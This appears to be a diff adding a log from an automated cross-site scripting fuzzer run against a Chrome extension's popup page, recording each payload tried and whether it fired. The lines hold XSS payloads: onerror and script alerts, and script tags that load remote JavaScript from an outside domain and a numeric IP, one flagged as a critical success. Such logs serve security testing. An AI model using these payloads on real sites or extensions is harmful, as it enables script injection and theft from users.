@@ -1,0 +1,8 @@
+2023-06-29 15:42:15,107, 2023-06-29 15:42:15, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', test123
+2023-06-29 15:42:15,118, 2023-06-29 15:42:15, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', blaoejds222
+2023-06-29 15:42:15,191, 2023-06-29 15:42:15, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', <img src=xss onerror=alert(1)>
+2023-06-29 15:42:15,780, 2023-06-29 15:42:15, Success, CRITICAL, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 1, <script src=//brutelogic.com.br/1.js>
+2023-06-29 15:42:18,422, 2023-06-29 15:42:18, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-29 15:42:18,433, 2023-06-29 15:42:18, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-29 15:42:19,005, 2023-06-29 15:42:18, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-29 15:42:21,686, 2023-06-29 15:42:21, Fail, Level <function info at 0x7f9c2a8bb6d0>, chrome-extension://aagklgegbfcdkmcggclaaibjplofpcih/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
